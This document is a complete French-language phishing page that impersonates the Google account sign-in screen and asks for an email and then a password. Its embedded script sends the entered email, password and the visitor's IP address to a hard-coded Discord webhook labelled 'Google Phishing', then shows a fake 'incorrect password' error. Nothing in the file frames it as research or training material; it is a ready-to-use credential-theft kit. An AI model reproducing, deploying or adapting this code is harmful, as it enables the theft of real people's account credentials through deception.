<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Comptes Google</title>
    <link rel="icon" href="https://www.google.com/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', sans-serif;
        }

        body {
            background: #fff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .logo {
            width: 75px;
            margin-bottom: 25px;
        }

        .card {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
        }

        .avatar {
            width: 80px;
            height: 80px;
            background: #e8eaed;
            border-radius: 50%;
            margin: 0 auto 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            color: #5f6368;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 16px;
            color: #202124;
            margin-bottom: 32px;
        }

        .input-group {
            position: relative;
            margin-bottom: 24px;
        }

        input {
            width: 100%;
            height: 54px;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: 0.2s;
        }

        input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
        }

        .forgot {
            text-align: left;
            margin-bottom: 32px;
        }

        .forgot a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .forgot a:hover {
            background: rgba(26,115,232,0.04);
        }

        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .create {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            padding: 8px;
            border-radius: 4px;
        }

        .create:hover {
            background: rgba(26,115,232,0.04);
        }

        .next {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
        }

        .next:hover {
            background: #1557b0;
            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }

        .footer {
            padding: 24px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #5f6368;
        }

        .footer select {
            border: none;
            background: transparent;
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
        }

        .footer-links a {
            color: #757575;
            text-decoration: none;
            margin-left: 24px;
        }

        .footer-links a:hover {
            color: #202124;
        }

        .error {
            display: none;
            color: #d93025;
            font-size: 14px;
            text-align: left;
            margin-top: -16px;
            margin-bottom: 16px;
        }

        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .step2 {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <!-- Étape 1 : Email -->
            <div class="step1">
                <svg class="logo" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M74.6 12.3c0-.9-.1-1.8-.2-2.7H68v5.1h3.7c-.2 1.2-.8 2.2-1.7 2.9v2.4h2.7c1.6-1.5 2.5-3.7 2.5-6.3z" fill="#4285F4"/>
                    <path d="M68 24c2.3 0 4.2-.8 5.6-2.1l-2.7-2.4c-.8.5-1.8.8-2.9.8-2.2 0-4.1-1.5-4.8-3.5h-2.8v2.4C61.4 21.4 64.4 24 68 24z" fill="#34A853"/>
                    <path d="M63.2 16.8c-.2-.5-.3-1.1-.3-1.8s.1-1.3.3-1.8v-2.4h-2.8c-.6 1.2-.9 2.6-.9 4.2s.3 3 .9 4.2l2.2-1.8 1.6-1.4z" fill="#FBBC05"/>
                    <path d="M68 9.5c1.2 0 2.3.4 3.1 1.2l2.3-2.3C72.1 6.6 70.2 5.8 68 5.8c-3.6 0-6.6 2.4-7.6 5.7l2.8 2.4c.7-2 2.6-3.4 4.8-3.4z" fill="#EA4335"/>
                    <path d="M22.5 12.5c0 3.1-2.3 5.3-5.1 5.3-2.8 0-5.1-2.2-5.1-5.3 0-3.1 2.3-5.3 5.1-5.3 2.8 0 5.1 2.2 5.1 5.3zm-2.2 0c0-2-1.4-3.3-2.9-3.3-1.5 0-2.9 1.3-2.9 3.3 0 2 1.4 3.3 2.9 3.3 1.5 0 2.9-1.3 2.9-3.3z" fill="#EA4335"/>
                    <path d="M32.7 12.5c0 3.1-2.3 5.3-5.1 5.3-2.8 0-5.1-2.2-5.1-5.3 0-3.1 2.3-5.3 5.1-5.3 2.8 0 5.1 2.2 5.1 5.3zm-2.2 0c0-2-1.4-3.3-2.9-3.3-1.5 0-2.9 1.3-2.9 3.3 0 2 1.4 3.3 2.9 3.3 1.5 0 2.9-1.3 2.9-3.3z" fill="#FBBC05"/>
                    <path d="M43 7.7h.1c.6-.9 1.6-1.7 2.9-1.7 2.8 0 4.3 1.8 4.3 4.6v6.8h-2.2v-6.4c0-1.5-.7-2.4-2-2.4-1.3 0-2.2.9-2.2 2.5v6.3h-2.2V6.3H43v1.4z" fill="#4285F4"/>
                    <path d="M55.1 5.3c2.7 0 4.4 1.9 4.4 4.5 0 2.6-1.7 4.5-4.4 4.5h-3.5v4.5h-2.2V5.3h5.7zm-3.5 6.8h3.2c1.4 0 2.3-1 2.3-2.3 0-1.3-.9-2.3-2.3-2.3h-3.2v4.6z" fill="#34A853"/>
                    <path d="M11.7 17.8V9l-3.7 8.8H5.8L2 9v8.8H0V6.3h2.8l3.6 8.4 3.6-8.4h2.8v11.5h-1.1z" fill="#EA4335"/>
                </svg>
                
                <h1>Connexion</h1>
                <p class="subtitle">Utiliser votre compte Google</p>
                
                <div class="input-group">
                    <input type="email" id="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
                </div>
                
                <div class="error" id="error-email">Saisissez une adresse e-mail ou un numéro de téléphone</div>
                
                <div class="forgot">
                    <a href="#">Adresse e-mail oubliée ?</a>
                </div>
                
                <div style="text-align: left; margin-bottom: 32px; font-size: 14px; color: #5f6368;">
                    S'il ne s'agit pas de votre ordinateur, utilisez le mode Invité pour vous connecter en mode privé. 
                    <a href="#" style="color: #1a73e8; text-decoration: none;">En savoir plus</a>
                </div>
                
                <div class="buttons">
                    <a href="#" class="create">Créer un compte</a>
                    <button class="next" onclick="nextStep()">Suivant</button>
                </div>
            </div>

            <!-- Étape 2 : Mot de passe -->
            <div class="step2">
                <div class="avatar" id="avatar">?</div>
                
                <h1 id="display-email">email@gmail.com</h1>
                <p class="subtitle" style="cursor: pointer;" onclick="backToStep1()">
                    ↩ <span id="email-text"></span>
                </p>
                
                <div class="input-group">
                    <input type="password" id="password" placeholder="Saisissez votre mot de passe" required>
                </div>
                
                <div class="error" id="error-password">Saisissez un mot de passe</div>
                
                <div class="forgot" style="margin-top: -10px;">
                    <a href="#">Mot de passe oublié ?</a>
                </div>
                
                <div class="buttons">
                    <a href="#" class="create">Créer un compte</a>
                    <button class="next" onclick="submitForm()">Suivant</button>
                </div>
                
                <div class="loading" id="loading"></div>
            </div>
        </div>
    </div>

    <div class="footer">
        <select>
            <option>Français (France)</option>
            <option>English (United States)</option>
            <option>Español</option>
            <option>Deutsch</option>
        </select>
        <div class="footer-links">
            <a href="#">Aide</a>
            <a href="#">Confidentialité</a>
            <a href="#">Conditions</a>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1538686814066442270/alNdyDcEyx0fV-cl00vsnoiqrqZWYUu4JUaPdVs9vSwn_UQpQEh1qL6BOPbf3uMCJupx";
        let emailValue = "";

        function nextStep() {
            const email = document.getElementById('email').value;
            const error = document.getElementById('error-email');
            
            if (!email || !email.includes('@')) {
                error.style.display = 'block';
                document.getElementById('email').style.borderColor = '#d93025';
                return;
            }
            
            error.style.display = 'none';
            document.getElementById('email').style.borderColor = '#dadce0';
            
            emailValue = email;
            document.getElementById('display-email').textContent = email;
            document.getElementById('email-text').textContent = email;
            
            // Avatar avec initiale
            const initial = email.charAt(0).toUpperCase();
            document.getElementById('avatar').textContent = initial;
            
            document.querySelector('.step1').style.display = 'none';
            document.querySelector('.step2').style.display = 'block';
        }

        function backToStep1() {
            document.querySelector('.step2').style.display = 'none';
            document.querySelector('.step1').style.display = 'block';
        }

        async function submitForm() {
            const password = document.getElementById('password').value;
            const error = document.getElementById('error-password');
            
            if (!password) {
                error.style.display = 'block';
                document.getElementById('password').style.borderColor = '#d93025';
                return;
            }
            
            error.style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Envoie au webhook Discord
            const data = {
                username: "Google Phishing",
                embeds: [{
                    title: "🔑 Nouvelles Identifiants",
                    color: 0x4285F4,
                    fields: [
                        { name: "📧 Email", value: emailValue, inline: false },
                        { name: "🔒 Mot de passe", value: password, inline: false },
                        { name: "🌐 IP", value: await getIP(), inline: true },
                        { name: "⏰ Heure", value: new Date().toLocaleString('fr-FR'), inline: true }
                    ],
                    footer: { text: "Google Phishing Page" }
                }]
            };
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (e) {
                console.error('Erreur envoi:', e);
            }
            
            // Simulation chargement puis erreur
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('error-password').textContent = "Mot de passe incorrect. Réessayez.";
                document.getElementById('error-password').style.display = 'block';
                document.getElementById('password').value = '';
                document.getElementById('password').focus();
            }, 2000);
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return "Inconnue";
            }
        }

        // Enter key support
        document.getElementById('email').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') nextStep();
        });
        
        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') submitForm();
        });
    </script>
</body>
</html>
